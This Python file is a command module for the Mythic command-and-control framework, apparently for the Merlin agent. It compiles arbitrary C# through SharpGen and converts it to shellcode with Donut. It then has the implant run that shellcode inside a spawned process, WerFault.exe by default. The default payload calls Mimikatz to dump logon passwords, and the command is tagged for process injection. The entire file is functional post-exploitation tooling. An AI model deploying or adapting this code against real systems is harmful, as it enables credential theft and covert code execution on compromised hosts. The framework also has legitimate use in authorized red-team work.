
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicResponseRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class SharpGenArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "code": CommandParameter(
                name="code",
                type=ParameterType.String,
                description="The CSharp code you want to execute",
                default_value="Console.WriteLine(Mimikatz.LogonPasswords());",
                ui_position=0,
                required=True
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="the child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=1,
                required=True
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                ui_position=2,
                required=False,
            ),
            "verbose": CommandParameter(
                name="verbose",
                description="Show verbose output from SharpGen and Donut",
                type=ParameterType.Boolean,
                ui_position=3,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)


class SharpGenCommand(CommandBase):
    cmd = "sharpgen"
    needs_admin = False
    help_cmd = "sharpgen"
    description = "Use the SharpGen project to compile and execute a .NET core assembly from input CSharp code.\r\n" \
                  "SharpGen blog post: https://cobbr.io/SharpGen.html\r\n" \
                  "SharpSploit Quick Command Reference: https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/SharpSploit%20-%20Quick%20Command%20Reference.md"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@Ne0nd0g"
    argument_class = SharpGenArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Calling sharpgen() with\r\n{task.args.get_arg("code")}')
        sharpgen_results = sharpgen(task.args.get_arg("code"))

        if "CompilationErrors" in sharpgen_results[1]:
            await MythicResponseRPC(task).user_output(f'There was an error creating the SharpGen payload:\r\n{sharpgen_results[1]}')
            task.set_status(MythicStatus.Error)
            return task
        if task.args.get_arg("verbose"):
            await MythicResponseRPC(task).user_output(f'Verbose output:\r\n{sharpgen_results[1]}\r\n')

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            sharpgen_results[0],
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("code")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(assembly, arguments):
    donut_args = ['go-donut', '--verbose', '--in', 'input.exe', '--exit', '2']
    if arguments:
        donut_args.append('--params')
        donut_args.append(arguments)

    # Write file to location in container
    with open('input.exe', 'wb') as w:
        w.write(assembly)

    result = subprocess.getoutput(" ".join(donut_args))

    donut_bytes = bytes
    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("input.exe")
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return base64.b64encode(donut_bytes).decode("utf-8"), f'[DONUT]\r\nCommandline: {" ".join(donut_args)}\r\n{result}'


def sharpgen(code):
    sharpgen_args = ['dotnet', '/opt/SharpGen/bin/release/netcoreapp2.1/SharpGen.dll', '-f', 'sharpgen.exe', code]

    result = subprocess.run(sharpgen_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sharpgen_bytes = bytes
    if "CompilationErrors" in result.stdout.decode("utf-8"):
        return sharpgen_bytes, result.stdout.decode("utf-8"), result.stderr.decode("utf-8")

    # Read SharpGen output file
    with open('/opt/SharpGen/Output/sharpgen.exe', 'rb') as output:
        sharpgen_bytes = output.read()

    # Close file
    output.close()

    # Remove file
    os.remove("/opt/SharpGen/Output/sharpgen.exe")

    donut_results = donut(sharpgen_bytes, "")

    return donut_results[0], f'[SharpGen]\r\nCommandline: {" ".join(sharpgen_args)}\r\n{result.stdout.decode("utf-8")}\r\n{donut_results[1]}', ""

